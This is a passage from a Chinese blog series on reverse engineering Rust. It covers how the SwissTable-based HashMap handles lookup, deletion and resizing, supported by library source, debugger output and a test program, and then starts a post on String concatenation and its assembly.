<p>以上图为例，如果现在需要查找3这个Key，Hash高7位为0x18，计算出的Hash值表示它应该被保存到组1中。但在插入时由于组1已满，因此被插入到组2中。在查找时，可首先通过一条浮点数指令将1个字节的值复制到16个字节的浮点数寄存器中，使浮点数寄存器的16个字节的值都等于0x18，随后使用两条浮点数指令将16个控制字节与浮点数寄存器进行逐字节比较获取16字节输出，相同的字节在输出中对应为值1，不同为0。最后获取到所有控制字节匹配的桶，进行Key的比较。</p>
<p>在上图的例子中，对组1进行匹配时发现没有找到3，且注意到这个组全满，因此需要继续匹配下面一组，在下面一组中找到了3这个Key，查找完成，Hit。</p>
<p>如果要查找6这个Key，且它的Hash值高7位也是0x18，那么在查找到组2没有找到后，还需要查找组3，组3中也没有，但组3不是全满，因此判断HashMap中不存在6这个Key，Miss。</p>
<p>从上面的分析可以看出，Swiss Tables在插入时遵循线性探测规则。根据上面所述的规则，我们能够基本完成对HashMap的插入、删除与查询操作。</p>
<p>不过上面的查找算法还有一个问题需要解决：对于已经删除的项，是应该将其视作满还是空？考虑一下：如果将删除项视作空，那么对于一堆全满的连续的多个组，在每个组中都可能保存有原本应该保存在这一堆中第一个组的元素，却因为前面的组都满了而被赶到了后面保存，将其视作空就相当于是减少了连续的全满的组的数量，假设有原本应该保存在组1的元素a被保存到组4，而组3删除了一个元素，那么在查找a的时候，只是找到组3就会退出，这样显然是错误的。因此查找时，对于已删除元素，应将其看做桶满。</p>
<h3 id="expand"><a class="markdownIt-Anchor" href="#expand"></a> Expand</h3>
<p>下面，我们还需要解决这个算法中的一个重要部分：扩容。如果所有组中空闲桶数量不足需要扩充，扩充前后同一个元素的Hash值计算出来应该保存到的组的索引有可能不同，这样原本应该保存到同一个组的元素可能会保存到相距很远的不同组中。举例说明，如果后57位确定组是通过将值对组数取模得到，那么对于一个原来有4组的HashMap，将其扩充到8组后，Hash值为0x5的数据在扩容前应该被保存到组1，但扩容后则会被保存到组5。扩容后若进行查找，也是从组5开始查找，此时无法查找到组1的这个数据。这个问题如何解决？如果组的数量没有即使扩充，当产生的连续全满组数量较多时，有可能会导致一次查找需要遍历所有这些全满组，导致效率有所降低，这个问题如何解决？</p>
<p>千言万语都说明，我们需要一个正确的高效的扩容算法。但很可惜的是，扩容算法的解释在网络中几乎没有，针对Swiss Tables的介绍大多是针对前面三种操作以及分析其查询效率为什么高。那么下面，我们将通过实际的试验验证Rust中HashMap的扩容策略。</p>
<p>首先，我们需要明确Rust HashMap在什么时候扩容。通过查看Rust源码发现了这样一个方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">bucket_mask_to_capacity</span>(bucket_mask: <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> bucket_mask &lt; <span class="number">8</span> &#123;</span><br><span class="line">        <span class="comment">// For tables with 1/2/4/8 buckets, we always reserve one empty slot.</span></span><br><span class="line">        <span class="comment">// Keep in mind that the bucket mask is one less than the bucket count.</span></span><br><span class="line">        bucket_mask</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// For larger tables we reserve 12.5% of the slots as empty.</span></span><br><span class="line">        ((bucket_mask + <span class="number">1</span>) / <span class="number">8</span>) * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从注释中可以看出，对于桶数量为1/2/4/8的HashMap，Rust总是保留一个空的桶，而更大的HashMap则保留1/8的桶为空。这一点可以通过反复调用HashMap的<code>capacity</code>方法找到端倪。当我们一个个插入数据的时候，输出的capacity去重后是这样一个序列：3, 7, 14(16x7÷8), 28(32x7÷8), 56(64x7÷8), …。</p>
<p>接下来，这里重点探究一下Rust HashMap在扩容前后数据位置的变化情况。笔者本来是想通过直接搜索源码查找相关代码的，但找了半天无功而返，因此只得寻求动态调试的帮助。结果很简单就找到了，但是不知道为什么，调试显示的行与实际行不同。下面找到了一个resize，但是看不懂：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt; &#123;</span><br><span class="line">    <span class="comment">// SAFETY:</span></span><br><span class="line">    <span class="comment">// 1. The caller of this function guarantees that `capacity &gt;= self.table.items`.</span></span><br><span class="line">    <span class="comment">// 2. We know for sure that `alloc` and `layout` matches the [`Allocator`] and</span></span><br><span class="line">    <span class="comment">//    [`TableLayout`] that were used to allocate this table.</span></span><br><span class="line">    <span class="comment">// 3. The caller ensures that the control bytes of the `RawTableInner`</span></span><br><span class="line">    <span class="comment">//    are already initialized.</span></span><br><span class="line">    <span class="keyword">self</span>.table.<span class="title function_ invoke__">resize_inner</span>(</span><br><span class="line">        &amp;<span class="keyword">self</span>.alloc,</span><br><span class="line">        capacity,</span><br><span class="line">        &amp;|table, index| <span class="title function_ invoke__">hasher</span>(table.bucket::&lt;T&gt;(index).<span class="title function_ invoke__">as_ref</span>()),</span><br><span class="line">        fallibility,</span><br><span class="line">        <span class="keyword">Self</span>::TABLE_LAYOUT,</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[allow(clippy::inline_always)]</span></span><br><span class="line"><span class="meta">#[inline(always)]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">resize_inner</span>&lt;A&gt;(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    alloc: &amp;A,</span><br><span class="line">    capacity: <span class="type">usize</span>,</span><br><span class="line">    hasher: &amp;<span class="keyword">dyn</span> <span class="title function_ invoke__">Fn</span>(&amp;<span class="keyword">mut</span> <span class="keyword">Self</span>, <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">    fallibility: Fallibility,</span><br><span class="line">    layout: TableLayout,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), TryReserveError&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    A: Allocator,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that `alloc` and `layout` matches the [`Allocator`] and [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that were used to allocate this table.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">new_table</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">prepare_resize</span>(alloc, layout, capacity, fallibility)?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SAFETY: We know for sure that RawTableInner will outlive the</span></span><br><span class="line">    <span class="comment">// returned `FullBucketsIndices` iterator, and the caller of this</span></span><br><span class="line">    <span class="comment">// function ensures that the control bytes are properly initialized.</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">full_byte_index</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="title function_ invoke__">full_buckets_indices</span>() &#123;</span><br><span class="line">        <span class="comment">// This may panic.</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = <span class="title function_ invoke__">hasher</span>(<span class="keyword">self</span>, full_byte_index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">// We can use a simpler version of insert() here since:</span></span><br><span class="line">        <span class="comment">// 1. There are no DELETED entries.</span></span><br><span class="line">        <span class="comment">// 2. We know there is enough space in the table.</span></span><br><span class="line">        <span class="comment">// 3. All elements are unique.</span></span><br><span class="line">        <span class="comment">// 4. The caller of this function guarantees that `capacity &gt; 0`</span></span><br><span class="line">        <span class="comment">//    so `new_table` must already have some allocated memory.</span></span><br><span class="line">        <span class="comment">// 5. We set `growth_left` and `items` fields of the new table</span></span><br><span class="line">        <span class="comment">//    after the loop.</span></span><br><span class="line">        <span class="comment">// 6. We insert into the table, at the returned index, the data</span></span><br><span class="line">        <span class="comment">//    matching the given hash immediately after calling this function.</span></span><br><span class="line">        <span class="keyword">let</span> (new_index, _) = new_table.<span class="title function_ invoke__">prepare_insert_slot</span>(hash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// SAFETY:</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `src` is valid for reads of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   table is alive and the `full_byte_index` is guaranteed to be</span></span><br><span class="line">        <span class="comment">//   within bounds (see `FullBucketsIndices::next_impl`);</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * `dst` is valid for writes of `layout.size` bytes, since the</span></span><br><span class="line">        <span class="comment">//   caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">        <span class="comment">//   that was used to allocate old table and we have the `new_index`</span></span><br><span class="line">        <span class="comment">//   returned by `prepare_insert_slot`.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` are properly aligned.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// * Both `src` and `dst` point to different region of memory.</span></span><br><span class="line">        ptr::<span class="title function_ invoke__">copy_nonoverlapping</span>(</span><br><span class="line">            <span class="keyword">self</span>.<span class="title function_ invoke__">bucket_ptr</span>(full_byte_index, layout.size),</span><br><span class="line">            new_table.<span class="title function_ invoke__">bucket_ptr</span>(new_index, layout.size),</span><br><span class="line">            layout.size,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The hash function didn&#x27;t panic, so we can safely set the</span></span><br><span class="line">    <span class="comment">// `growth_left` and `items` fields of the new table.</span></span><br><span class="line">    new_table.growth_left -= <span class="keyword">self</span>.items;</span><br><span class="line">    new_table.items = <span class="keyword">self</span>.items;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We successfully copied all elements without panicking. Now replace</span></span><br><span class="line">    <span class="comment">// self with the new table. The old table will have its memory freed but</span></span><br><span class="line">    <span class="comment">// the items will not be dropped (since they have been moved into the</span></span><br><span class="line">    <span class="comment">// new table).</span></span><br><span class="line">    <span class="comment">// SAFETY: The caller ensures that `table_layout` matches the [`TableLayout`]</span></span><br><span class="line">    <span class="comment">// that was used to allocate this table.</span></span><br><span class="line">    mem::<span class="title function_ invoke__">swap</span>(<span class="keyword">self</span>, &amp;<span class="keyword">mut</span> new_table);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写到这里，笔者已经被这个问题纠缠了两周，不堪忍受的我决定开始人肉找规律，将所有的Hash值转换为二进制，看看归于同一组的Hash到底有什么相同之处。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Inserted 1, hash = 33bd1e335a4e43f0, h2 = 19, map capacity = 3</span><br><span class="line">Inserted 3, hash = 56303fd171416940, h2 = 2b, map capacity = 3</span><br><span class="line">Inserted 15, hash = cde8088c422f9d0, h2 = 6, map capacity = 3</span><br><span class="line">Inserted 22, hash = 411807d47ecb5b61, h2 = 20, map capacity = 7</span><br><span class="line">Inserted 23, hash = bbf28bf43ce33881, h2 = 5d, map capacity = 7</span><br><span class="line">Inserted 45, hash = 217bed8f242fc391, h2 = 10, map capacity = 7</span><br><span class="line">Inserted 46, hash = d97613d73c3edd81, h2 = 6c, map capacity = 7</span><br><span class="line">Inserted 48, hash = ec9ec7fbb5226711, h2 = 76, map capacity = e</span><br><span class="line">Inserted 53, hash = ea21590131a0aad0, h2 = 75, map capacity = e</span><br><span class="line">Inserted 55, hash = 6e28ebd650236d51, h2 = 37, map capacity = e</span><br><span class="line">Inserted 59, hash = 263478baaf15b7f1, h2 = 13, map capacity = e</span><br><span class="line">Inserted 60, hash = 2aebb2b8fdb4f070, h2 = 15, map capacity = e</span><br><span class="line">Inserted 73, hash = 163193d2c2c5b7c1, h2 = b, map capacity = e</span><br><span class="line">Inserted 78, hash = a8f5a0a55cea2e21, h2 = 54, map capacity = e</span><br><span class="line">Inserted 85, hash = dbe1512d01714890, h2 = 6d, map capacity = 1c</span><br><span class="line">Inserted 87, hash = 1159a3327874fea1, h2 = 8, map capacity = 1c</span><br><span class="line"></span><br><span class="line">22:0110│  0x5555555bdf40 ◂— 0x1513377576100619</span><br><span class="line">23:0118│  0x5555555bdf48 ◂— 0xffffffffffffff6d</span><br><span class="line">24:0120│  0x5555555bdf50 ◂— 0xff08540b6c5d202b</span><br><span class="line">25:0128│  0x5555555bdf58 ◂— 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">0011 0011 1011 1101 0001 1110 0011 0011 0101 1010 0100 1110 0100 0011 1111 0000</span><br><span class="line">0000 1100 1101 1110 1000 0000 1000 1000 1100 0100 0010 0010 1111 1001 1101 0000</span><br><span class="line">0010 0001 0111 1011 1110 1101 1000 1111 0010 0100 0010 1111 1100 0011 1001 0001</span><br><span class="line">1110 1100 1001 1110 1100 0111 1111 1011 1011 0101 0010 0010 0110 0111 0001 0001</span><br><span class="line">1110 1010 0010 0001 0101 1001 0000 0001 0011 0001 1010 0000 1010 1010 1101 0000</span><br><span class="line">0110 1110 0010 1000 1110 1011 1101 0110 0101 0000 0010 0011 0110 1101 0101 0001</span><br><span class="line">0010 0110 0011 0100 0111 1000 1011 1010 1010 1111 0001 0101 1011 0111 1111 0001</span><br><span class="line">0010 1010 1110 1011 1011 0010 1011 1000 1111 1101 1011 0100 1111 0000 0111 0000</span><br><span class="line">1101 1011 1110 0001 0101 0001 0010 1101 0000 0001 0111 0001 0100 1000 1001 0000</span><br><span class="line"></span><br><span class="line">0101 0110 0011 0000 0011 1111 1101 0001 0111 0001 0100 0001 0110 1001 0100 0000</span><br><span class="line">0100 0001 0001 1000 0000 0111 1101 0100 0111 1110 1100 1011 0101 1011 0110 0001</span><br><span class="line">1011 1011 1111 0010 1000 1011 1111 0100 0011 1100 1110 0011 0011 1000 1000 0001</span><br><span class="line">1101 1001 0111 0110 0001 0011 1101 0111 0011 1100 0011 1110 1101 1101 1000 0001</span><br><span class="line">0001 0110 0011 0001 1001 0011 1101 0010 1100 0010 1100 0101 1011 0111 1100 0001</span><br><span class="line">1010 1000 1111 0101 1010 0000 1010 0101 0101 1100 1110 1010 0010 1110 0010 0001</span><br><span class="line">0001 0001 0101 1001 1010 0011 0011 0010 0111 1000 0111 0100 1111 1110 1010 0001</span><br></pre></td></tr></table></figure>
<p>上面最后的几大行二进制数据中，上面的是保存到第一组的Hash，下面的是保存到第二组的Hash，看出来有什么规律了吗？可以发现，上面的Hash中所有的第5低的bit均为1，下面的均为0。为了严谨考虑，笔者增加了数据量进行了进一步测试，发现当组数为4时，是按照第5低bit和第6低bit来判断一个数据应该被分到哪组。</p>
<p>至此，我们最终通过实验获知了Rust中的HashMap的分组方式，与传统的SwissTable不同，分组的标志位从第5低bit开始，这也是为什么笔者一开始找了很长时间源码与规律依然一无所获。</p>
<p>下面是笔者的测试程序，读者可以将这个程序编译后通过gdb调试进行HashMap内存空间的一一比对。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;BuildHasher, Hash, Hasher&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rs</span> = std::collections::hash_map::RandomState::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">with_hasher</span>(rs);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ctr</span> = [<span class="number">0</span>;<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">1000u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = map.<span class="title function_ invoke__">hasher</span>().<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        i.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">hash</span> = hasher.<span class="title function_ invoke__">finish</span>();</span><br><span class="line">        <span class="keyword">if</span> ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] == <span class="number">13</span> &#123; <span class="keyword">continue</span> &#125;</span><br><span class="line">        <span class="keyword">if</span> ctr[<span class="number">0</span>] + ctr[<span class="number">1</span>] + ctr[<span class="number">2</span>] + ctr[<span class="number">3</span>] == <span class="number">13</span> * <span class="number">4</span> &#123; <span class="keyword">break</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h2</span> = hash &gt;&gt; <span class="number">57</span>;</span><br><span class="line">        map.<span class="title function_ invoke__">insert</span>(i, i);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Inserted &#123;i:&lt;02&#125;, hash = &#123;hash:&lt;064b&#125;, h1(suspected) = &#123;:x&#125;, h2 = &#123;:x&#125;, map capacity = &#123;:x&#125;&quot;</span>,</span><br><span class="line">                 (hash &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>, h2, map.<span class="title function_ invoke__">capacity</span>());</span><br><span class="line">        ctr[(hash <span class="keyword">as</span> <span class="type">usize</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Finished!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在实际测试过程中，当数据量较大时，经常需要线性后移，即当前组已满，需要将Hash值移动到后面一个组中。实际调试时发现，一个组中似乎最多只会保存15个数据而不是填充满，在几次调试后均未发现填充满的组。</p>
<p>另外需要注意的是，在保存HashMap的堆Chunk中，数据的排布方式有一些独特。数据保存在SwissTable之前，设SwissTable的起始地址为x，那么x+i处标志字节所对应的数据地址位于x-sizeof(key+value)*i，笔者猜测这样是为了便于Rust进行寻址，因为对HashMap的操作中，普遍是传入的SwissTable地址而非数据的起始地址，这样可以在不知道数据起始地址的情况下快速对应到数据。而对于SwissTable，若实际的组数为2<sup>n</sup>，那么保存到堆中的组应该为2<sup>n</sup>+1，最后一组与第一组的数据相同。这可能是为了在最后一组满且需要保存数据时能够快速检测到需要遍历到第一组添加数据。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文的信息量比较大，下面我们来简单总结一下。</p>
<ul>
<li>对于Rust，其HashMap的底层实现是SwissTable，这是一种高效的HashMap算法。</li>
<li>Rust在HashMap中使用的默认Hash算法是SipHash算法。</li>
<li>Rust会保证所有组至少留出1/8的空闲空间，如果下一次添加数据打破了这一规则，Rust将对组进行扩充。</li>
<li>Rust将Hash去掉最低4位和最高7位，剩余的值作为组的索引值，其值对组数取模后的值即为一个键值对应该被保存的组号。如果组满则实行线性规则在后面的组中插入。</li>
<li>Rust在初始化HashMap时使用两个随机数作为Hash算法的参数，这使得相同的键值对在不同的HashMap中计算的Hash值也不同。</li>
<li>Rust的HashMap其余规则与SwissTable定义的规则没有什么太大的区别。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/26/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-6/" class="post-title-link" itemprop="url">Rust逆向学习 (6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-26 17:54:46 / 修改时间：23:16:09" itemprop="dateCreated datePublished" datetime="2023-11-26T17:54:46+08:00">2023-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-string"><a class="markdownIt-Anchor" href="#reverse-for-string"></a> Reverse for String</h1>
<p>上一篇文章简单分析了Vec变长数组的结构，今天来介绍String。实际上Rust的字符串类型对于我们并不陌生，在前面几篇文章的几乎任何一个示例中都可以找到它们。</p>
<p>我们曾经提到过，String类型在栈中占0x18大小，其中包括字符串的指针、字符串长度、字符串容量。看上去好像什么问题都没有，但如果你使用Python或C/C<ins>开发过一些项目，你可能会遇到一些与字符串编码有关的问题。在C</ins>中，由于需要考虑多种字符编码方式，字符被分为char、wchar_t、tchar等等，它们占用的字节数量还不相同，如果需要转换还需要使用特定的函数完成，对于一些需要进行编码转换的场景来说，稍有一个不注意，可能就是一串乱码怼在你的脸上，让人深恶痛绝。</p>
<p>但对于Rust而言，它规定，只要是我Rust写的程序，程序里面的所有字符串全都用UTF-8编码。这样就从根本上杜绝了编码转换的问题。</p>
<p>不过，这也产生了一些问题，其中影响最大的可能就是字符串不可索引了。由于使用UTF-8编码，对于不同的字符，其占用的字节数量可能不同，而Rust又不能将字符串单纯地看做单字节数组，因此Rust无法知道在一个既有中文又有英文又有其他语言的字符串中，第某个有效字符在字符串中的偏移地址到底是多少。对于一个Rust字符串，它的长度指的是占用的内存空间大小，因此对于1个中文字符组成的字符串，它的长度实际上是3。</p>
<p>下面介绍一下Rust中String的常用操作。</p>
<h2 id="push_str-与"><a class="markdownIt-Anchor" href="#push_str-与"></a> <code>push_str</code> 与 <code>+</code></h2>
<p>在Rust中，<code>push_str</code>方法与运算符<code>+</code>都能够将一个字符串拼接到另一个字符串的后面。让我们看一下二者在汇编上有什么区别。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s += <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::ops::arith::AddAssign&lt;&amp;<span class="type">str</span>&gt;&gt;::add_assign</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
